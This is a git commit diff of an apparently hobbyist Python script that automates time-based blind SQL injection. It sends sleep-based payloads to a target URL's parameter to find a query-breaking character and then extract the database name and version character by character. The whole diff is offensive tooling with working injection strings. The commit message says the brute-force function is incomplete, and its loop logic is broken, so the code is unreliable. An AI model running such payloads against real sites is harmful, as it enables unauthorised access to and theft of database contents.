26f7aa273150db5761484512c34311156ed2b0a7
BluberryPickle <milinddinesh@gmail.com>
2021-07-10 02:50:39 +0530

    modified the bruteforce function (incomplete)

--- sqli automation/fun.py
+++ sqli automation/fun.py
@@ -4,14 +4,18 @@ import requests
 from requests.models import parse_url
 from itertools import count
 
+#function to find the time taken by a request
+def time(url):
+    r = requests.get(url)
+    t = r.elapsed.total_seconds()
+    return t
+
 def escape(url,param,list = ["'",'"',')','")',"')","' OR 1 = 1",'" OR 1 = 1',"\\",",","#","/",'.']) :      #code to find the char to break query.
-    
     char = []
     print("Trying to break the query...")
     for i in list:
         url = url+param+"=1"+i+" and sleep(1.5); --+"
-        r=requests.get(url)
-        t = r.elapsed.total_seconds()
+        t = time(url)
         if t > 1.5 :
             char.append(i)
             break
@@ -42,8 +46,7 @@ def len_find(char,param,fun,url) :
     state = 1
     while state == 1 :
         payload = url+"?"+param+"=1"+char+" AND if((select length("+fun+") = "+str(i)+"),sleep(7),null) --+"
-        r = requests.get(payload)
-        t = r.elapsed.total_seconds()
+        t = time(payload)
         if t > 7 :
             state = 0
             return i
@@ -52,10 +55,22 @@ def len_find(char,param,fun,url) :
 #Function to bruteforce information from the database
 def bruteforce(char,param,url):
     functions = ['database()','version(),user()']
+    data = {} # dict to store the details
     for f in functions :
         length = len_find(char,param,f,url)
-        c = count()
-        payload = url+"?"+param+"=-1"+char+" and if ((select "+f+")=\"security\", sleep(5),null); --+"
-        #?id=1' AND if(((ascii(substr((select database()),1,1))) = 56),sleep(5),null) --+
+        temp = '' # temporary var to stroe the data extracted
+        c = count(start = 32)
+        for i in range(length):
+            while c < 127 :
+                payload = url + "?" + param + "=1"+char+ " AND if(((ascii(substr((select database()),"+i+",1))) = "+next(c)+"),sleep(7),null) --+"
+                t = time(payload)
+                if t > 7 :
+                    temp = temp + chr(next(c)-1)
+                else : next(c)
+        data[f] = temp
+
+        #?id=1' AND if(((ascii(substr((select database()),i,1))) = c),sleep(7),null) --+
     print(payload)
+
+    #if (substr((select "+f+"),i,1)=\"security\", sleep(5),null); --+"
 
